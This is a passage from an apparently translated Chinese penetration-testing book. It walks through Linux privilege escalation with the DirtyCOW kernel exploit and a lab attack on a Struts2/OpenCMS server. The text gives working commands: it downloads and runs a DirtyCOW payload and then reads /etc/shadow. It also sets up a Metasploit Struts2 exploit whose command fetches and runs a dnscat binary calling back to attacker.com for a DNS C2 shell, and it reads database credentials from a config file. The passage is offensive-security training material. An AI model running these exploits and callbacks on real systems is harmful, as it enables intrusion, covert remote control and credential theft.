![](4-49.png){.calibre11}
这是一个非常长的报告，内容是你可能想要了解的关于底层系统的所有信息，这对于未来的活动来说是非常好的。
一旦我们获得了关于系统的信息，我们就会试图看看我们是否能够利用这些漏洞中的任何一个。如果我们找不到任何可用的漏洞或服务、计划任务中的错误配置，我们将直接在系统或应用程序上进行攻击。我试着最后做这些，因为总是有一个潜在的可能性可以直接使系统挂掉。
我们可以运行一个名为
[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}
的工具来分析主机系统并识别缺失的补丁和漏洞。一旦识别出漏洞，该工具还将向你提供可用
PoC 漏洞的链接。
![](4-50.png){.calibre11}
现在，我们要利用什么呢？这就是经验和实践真正发挥作用的地方。在我的实验中，我将配置大量不同的
Linux
版本，以验证这些漏洞攻击不会使底层系统崩溃。在这个场景中，我最喜欢的一个漏洞是
DirtyCOW。
DirtyCOW 的工作原理是"在Linux内核的内存子系统处理写访问时只读私有映射
COW
情况中断的方式中发现了竞争条件。非特权本地用户可以使用此缺陷获取对其他只读内存映射的写访问权限，从而增加他们在系统上的权限。"\[[https://dirtycow.ninja/](https://dirtycow.ninja/){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}\]
简而言之，此漏洞允许攻击者通过内核漏洞从非特权用户转到 `root`{.calibre14
.pcalibre4 .pcalibre3}
权限。这是我们能想到的的最佳权限提升的方法！但有一个问题是它会导致一些内核崩溃，所以我们必须确保在正确的
Linux 内核上使用正确的版本。
在 Ubuntu 上测试 DirtyCOW (ubuntu 14.04.1 LTS 3.13.0-32-generic
x86_64)：
-   下载 DirtyCOW payload
    -   wget [http://bit.ly/2vdh2Ub](http://bit.ly/2vdh2Ub){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"} -O
        dirtycow-mem.c
-   编译 DirtyCOW payload
    -   gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
-   运行 DirtyCOW 以访问系统
    -   ./dirtycow-mem
-   关闭定期写回以使漏洞稳定
    -   echo 0 \> /proc/sys/vm/dirty_writeback_centisecs
-   Try reading the shadow file
    -   cat /etc/shadow
## Linux 横向移动实验 {#4_the_drive_compromising_the_network.html#linux-横向移动实验 .calibre12}
横向移动的问题是，没有一个设置起点逐步深入的环境很难练习。因此，我们向你介绍了
CSK
网络安全实验。在这个实验中，你将在不同的设备之间进行切换，使用最近的漏洞攻击和权限提升攻击，并利用
Linux 环境中本身存在的应用程序进行攻击。
**设置虚拟环境**
这个虚拟实验环境的设置有些复杂。这是因为网络需要三个不同的静态虚拟机才能运行，并且你需要事先进行一些设置。所有这些都在
VMware Workstation 和 VMware Fusion 中进行了测试，因此如果你使用的是
VirtualBox，那么你可能需要对它进行适当的调整。
下载三台虚拟机：
-   [http://thehackerplaybook.com/get.php?type=csk-lab](http://thehackerplaybook.com/get.php?type=csk-lab){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   虽然你不需要这些系统的 root 帐户，但 hacker/changeme
    是用户名/密码，尽量不要更改。
所有三台虚拟机都配置为使用 NAT
网络接口。要使该实验环境正常工作，你必须在 VMware 中配置虚拟机的 NAT
设置，才能使用172.16.250.0/24网络。要在 Windows VMware Workstation
中执行此操作，请执行以下操作：
-   在开始菜单，依次点击 编辑 -\> 虚拟网络编辑器 -\> 更改设置
-   选择需要设置 NAT 类型的界面(我这里设置的是 VMnet8)
-   修改子网 IP 为 172.16.250.0 ，并点击 应用
在 OSX 中，操作更复杂。你需要：
-   复制原始的 dhcpd.conf 作为备份
    -   sudo cp /Library/Preferences/VMware\\
        Fusion/vmnet8/dhcpd.conf/Library/Preferences/VMware\\
        Fusion/vmnet8/dhcpd.conf.bakup
-   编辑 dhcpd.conf 文件以使用172.16.250.x 而不是192.168.x.x
    -   sudo vi /Library/Preferences/VMware\\ Fusion/vmnet8/dhcpd.conf
-   编辑 nat.conf 以使用正确的网关
    -   sudo vi /Library/Preferences/VMware\\ Fusion/vmnet8/nat.conf
        -   #NAT gateway address
        -   ip = 172.16.250.2
        -   netmask = 255.255.255.0
-   重新启动服务：
    -   sudo /Applications/VMware\\
        Fusion.app/Contents/Library/services/services.sh \--stop
    -   sudo /Applications/VMware\\
        Fusion.app/Contents/Library/services/services.sh \--start
现在，你应该能够在 NAT 模式下启动 THP Kali
VM，并在172.16.250.0/24范围内获得一个 DHCP 分配的
IP。如果你这样做了，就同时启动所有其他三个实验虚拟机，然后开始黑客攻击吧。
### 攻击 CSK 安全网络 {#4_the_drive_compromising_the_network.html#攻击-csk-安全网络 .calibre15}
最后，你已经从 Windows
环境转到了安全生产环境网络中。从你所有的侦察和研究中，你知道所有的秘密都存储在这里。这是他们保护最严密的网络之一，我们知道他们已经分步部署了他们的安全基础设施。从他们的文档来看，似乎有多个
VLAN
需要进行入侵，而且你似乎需要在各个系统之间切换才能访问核心数据库。这就是你发起这次攻击的目的\...\...
以安全网络区域的外部为中心，可以看到为此环境配置的网络范围位于172.16.250.0/24网络中。由于你对这个网络不太了解，你可以先进行一些非常简单的
nmap 扫描。你需要确定哪些系统可以从网络外部访问，以确定如何启动攻击。
扫描网络:
-   nmap 172.16.50.0/24
你注意到有三个设备正在运行，但只有一个设备启用了 Web
端口。看起来其他两个设备与安全网络之外是隔离的，这意味着我们必须首先入侵172.16.250.10设备才能转到其他两个服务器。访问第一个系统（172.16.250.10），你会看到
Apache Tomcat 正在监听端口8080，而一些 OpenCMS 在端口80上。运行 web
fuzzer 时，你会注意到 OpenCMS 页面也在运行 Apache Struts2（或者是
struts2 showcase）。你的脑海立马想到了Equifax
数据泄露事件中黑客的攻击手法。你喜出望外，太好了，但你还是要检查一下。在
msfconsole 上运行一个快速搜索并测试漏洞
`struts2_content_type_ognl`{.calibre14 .pcalibre4 .pcalibre3}。
![](4-51.png){.calibre11}
我们知道，CSK
会严格监控受保护的网络流量，其内部服务器可能不允许直接访问公司网络。为了解决这个问题，我们必须使用我们的
DNS C2 payload 和 dnscat2 来通过 UDP 而不是 TCP
进行通信。当然，在真实操作中，我们可能会使用权威的 DNS
服务器，但仅针对本地测试的话，我们将配置自己的 DNS 服务器。
\[本书的 Kali 机器\]
本书的定制 Kali 虚拟机应该拥有执行攻击的所有工具。
-   我们需要在 Web 服务器上放上我们的 payload，这样我们就可以让我们的
    metasploit payload 抓取 dnscat 恶意软件。在 dnscat2 客户机文件夹中是
    dnscat 二进制文件。
    -   cd /opt/dnscat2/client/
    -   python -m SimpleHTTPServer 80
-   启动 dnscat 服务器
    -   cd /opt/dnscat2/server/
    -   ruby ./dnscat2.rb
-   为 dnscat 记录你的密钥
![](4-52.png){.calibre11}
-   打开新终端并加载 Metasploit
    -   msfconsole
-   搜索 struts2并加载 struts2漏洞
    -   search struts2
    -   use exploit/multi/http/struts2_content_type_ognl
-   配置 struts2漏洞以获取我们的 dnscat payload
    并在受害者服务器上执行。确保在前面更新你的 IP 和密钥。
    -   set RHOST 172.16.250.10
    -   set RPORT 80
    -   set TARGETURI struts2-showcase/showcase.action
    -   set PAYLOAD cmd/unix/generic
    -   set CMD wget http://``{=html}/dnscat
        -O /tmp/dnscat && chmod+x /tmp/dnscat && /tmp/dnscat \--dns
        server=attacker.com，port=53
        \--secret=``{=html}``{=html}``{=html}
    -   run
-   一旦 payload 执行，你将不会在 Metasploit
    中得到任何确认，因为我们使用了 dnscat 的 payload。你需要检查你的
    dnscat 服务器是否有任何使用 DNS 流量的连接。
![](4-53.png){.calibre11}
-   回到 dnscat2服务器上，检查新执行的 payload 并创建一个 shell 终端。
    -   与第一个 payload 进行交互
        -   window -i 1
    -   生成 shell 进程
        -   shell
    -   用键盘按钮返回主菜单
        -   ctrl + z
    -   与新 shell 进行交互
        -   window -i 2
    -   键入 shell 命令
        -   ls
![](4-54.png){.calibre11}
你已经入侵了 OpenCMS/Apache Struts
服务器！现在要做什么？你需要花一些时间检查服务器并寻找有趣的信息。你想起来服务器正在运行
OpenCMS Web 应用程序，并确定该应用程序是在 /opt/tomcat/webapps/kittens
下配置的。在查看 OpenCMS
属性的配置文件时，我们发现数据库、用户名、密码和 IP 地址为
172.16.250.10。
检索数据库信息：
-   cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
![](4-55.png){.calibre11}
我们成功连接到数据库了，但看不到太多信息。这是因为我们目前是一个有限的
Tomcat
用户，这确实阻碍了我们的攻击。因此，我们需要找到一种提权的方法。在服务器上运行
post exploitation reconnaissance（uname -a && lsb_release
-a），你可以识别出这是一个非常旧的 Ubuntu